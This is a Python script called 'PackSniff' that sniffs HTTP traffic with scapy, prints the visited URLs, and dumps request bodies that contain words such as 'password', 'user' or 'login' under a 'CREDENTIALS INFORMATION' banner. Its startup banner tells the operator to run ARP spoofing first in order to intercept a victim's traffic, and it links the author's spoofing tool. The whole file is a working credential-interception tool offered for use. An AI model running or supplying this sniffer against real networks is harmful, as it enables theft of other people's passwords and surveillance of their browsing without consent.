#!/usr/bin/env python 

import scapy.all as scapy 
import optparse
from scapy.layers import http

#start the program 
print(" ") 
print("		[=------------------------------------------------------------=]                  ")
print("		[=----------------------=[  PackSniff ]=---------------------=]                   ")
print("		[=------------------=[ Coded by Eslam Akl ]=------------------=]                  ")
print("		[=----------------------=[  @eslam3kl  ]=---------------------=]                  ")
print("		[=------------------------------------------------------------=]                  ")
print("[+] Note: Before using this tool you should use ARP spoofing tool if you want to be MITM ")
print("You can use my own tool to perform ARP Spoofing from here https://github.com/eslam3kl/ARP-Spoofer")
print(" ")

#Function to get the user input 
def get_interface(): 
	parser = optparse.OptionParser()
	parser.add_option("-i","--interface",dest="iface",help="The interface which you want to sniff it ")
	(options, arguments) = parser.parse_args()
	#check of the user input 
	if not options.iface: 
		print("[-] Enter the interface, see --help for more info")
		raise SystemExit 
	else: 
		return options.iface

#function to sniff the packet
def sniff(interface): 
	scapy.sniff(iface=interface, store=False, prn=sniffed_packets) 

#function to run when the sniff packet function will call it 
def sniffed_packets(packet): 
	if packet.haslayer(http.HTTPRequest): 
		#uncomment the next line if you want to show the whole info of the request 
		#print(packet.show())
		url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
		print ("\n[+] The website URL is: " + url + "\n") 

		if packet.haslayer(scapy.Raw):
			load = packet[scapy.Raw].load 
			keywords = ["username", "password", "login", "user", "pwd", "pass"]
			for element in keywords: 
				if element in load: 
					print("\n\n++++++++++++++++CREDENTIALS INFORMATION++++++++++++++++\n" + load + "\n\n++++++++++++++++END++++++++++++++++\n") 
					break
		
#main function 	
iface = get_interface()
sniff(iface)

#THANKS FOR USING MY TOOL, HOPE THAT IT HELPS YOU. 
